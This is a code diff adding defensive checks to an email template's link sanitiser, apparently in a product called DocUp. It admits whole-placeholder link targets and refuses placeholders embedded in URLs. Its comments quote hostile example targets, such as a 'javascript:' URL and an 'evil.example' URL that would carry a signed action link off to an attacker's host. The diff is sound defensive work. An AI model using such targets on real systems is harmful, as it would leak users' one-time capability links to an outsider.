@@ -227,6 +227,60 @@ final class SlotMarkdown
     {
         $href = trim($href);
 
+        /*
+         * 🛑 A link target that is **exactly one placeholder** is admitted, and
+         * this is the case §8.14.13 is for: "Your build finished.
+         * [See it]({action_url})" is the single most natural thing an operator
+         * writes in the intro slot, and the first version of this method
+         * refused it — which would have left `{action_url}` usable only as
+         * visible text, printing a URL at the reader instead of linking it.
+         *
+         * It is also the *safest* target in the grammar, which is the part
+         * worth being precise about. The value does not come from the tenant:
+         * it comes from {@see EmailVariables::escape()}, which the sending code
+         * builds from DocUp's own data and escapes once. The tenant chooses
+         * only *which* of the names their slot is offered, and
+         * {@see self::assertPlaceholdersKnown()} refuses one it was not.
+         *
+         * 🛑 **Exactly one, and nothing around it.** The anchor and the
+         * terminator are the whole control: `javascript:{action_url}` and
+         * `{action_url}@evil.example` are both refused by the next branch,
+         * because a placeholder that could be a *fragment* of a target would
+         * let a tenant build a URL out of DocUp's own value.
+         */
+        if (preg_match('/^\{[a-z][a-z0-9_]{0,30}\}$/', $href) === 1) {
+            return $href;
+        }
+
+        /*
+         * 🛑 A placeholder **inside** a target is refused, and this is a real
+         * disclosure control rather than tidiness.
+         *
+         * `[Confirm](https://evil.example/?u={action_url})` is a perfectly
+         * valid `https://` URL, so the shape rules below accept it — and
+         * substitution would then deliver DocUp's own action URL to a host the
+         * tenant chose. An action URL is a **capability**: a signed, one-time
+         * link that does something on the recipient's behalf. Handing it to a
+         * tenant's server is handing them that capability for every email
+         * DocUp sends on their behalf.
+         *
+         * Found by the test that asserted a placeholder may be a whole target;
+         * four of its five hostile spellings were refused by the shape rules
+         * and this one was not.
+         *
+         * A placeholder in the link **text** is still fine — it is text — and
+         * so is one anywhere in a paragraph. It is only a target that confers
+         * anything.
+         */
+        if (preg_match(self::PLACEHOLDER, $href) === 1) {
+            throw TokenRefused::of(
+                TokenRejection::UnsafeLinkTarget,
+                $path,
+                'a placeholder may be a whole link target or none of one; '
+                .'substituting one into a URL would send DocUp’s own value to that host',
+            );
+        }
+
         if (preg_match('/^mailto:[^\s<>"\']{3,254}$/i', $href) === 1) {
             return $href;
         }
